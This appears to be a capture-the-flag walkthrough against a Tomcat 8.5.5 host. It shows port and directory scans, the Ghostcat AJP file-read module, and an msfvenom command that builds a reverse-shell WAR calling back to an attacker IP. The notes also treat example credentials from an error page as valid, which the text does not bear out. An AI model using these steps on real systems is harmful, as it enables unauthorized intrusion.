THOMPSON.




[>>> 1. ENUMERATION: PORTS/SERVICES]
[ACTION: nmap quick all ports scan]
nmap -sS -T4 -sV -p- 10.10.176.74
[OUTPUT]
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[NOTE]
ajp is used to connect to web servers.


[>>> 2. RECON: http://10.10.176.74:8080/]
Landing site of tomcat 8.5.5.
[OUTPUT]
Managing Tomcat
For security, access to the manager webapp is restricted. Users are defined in:

$CATALINA_HOME/conf/tomcat-users.xml
In Tomcat 8.5 access to the manager application is split between different users.   Read more...


Release Notes
Changelog
Migration Guide
Security Notices
[NOTE]
catalina is probably a user.
cve-2020-1938 might work.
I'll follow https://www.rapid7.com/db/modules/auxiliary/admin/http/tomcat_ghostcat/




[>>> 3. RECON: useful files]
[ACTION: run metasploit module]
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 10.10.176.74
run
[OUTPUT]
[*] Running module against 10.10.176.74
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
  version="3.1"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
[+] 10.10.176.74:8009 - File contents save to: /home/user0/.msf4/loot/20250803132837_default_10.10.176.74_WEBINFweb.xml_978113.txt
[*] Auxiliary module execution completed




[>>> 4. ENUMERATE: DIRECTORIES]
[ACTION: gobuster scan for common directories]
gobuster dir -u http://10.10.176.74:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[OUTPUT]
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
Progress: 4746 / 4747 (99.98%)


[ACTION: explore http://10.10.176.74:8080/host-manager/html]
Test random cred pair.
[OUTPUT]
401 Unauthorized
You are not authorized to view this page. If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.

For example, to add the admin-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.

<role rolename="admin-gui"/>
<user username="tomcat" password="s3cret" roles="admin-gui"/>
Note that for Tomcat 7 onwards, the roles required to use the host manager application were changed from the single admin role to the following two roles. You will need to assign the role(s) required for the functionality you wish to access.

admin-gui - allows access to the HTML GUI
admin-script - allows access to the text interface
The HTML interface is protected against CSRF but the text interface is not. To maintain the CSRF protection:

Users with the admin-gui role should not be granted the admin-script role.
If the text interface is accessed through a browser (e.g. for testing since this interface is intended for tools not humans) then the browser must be closed afterwards to terminate the session.
[NOTE]
We got a valid cred pair: tomcat|s3cret
With admin access, we should have a way to upload a shell.




[>>> 5. PRIVESC: to user]
[ACTION: create shell in a war file]
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.23.25.109 LPORT=4444 -f war > shell.war
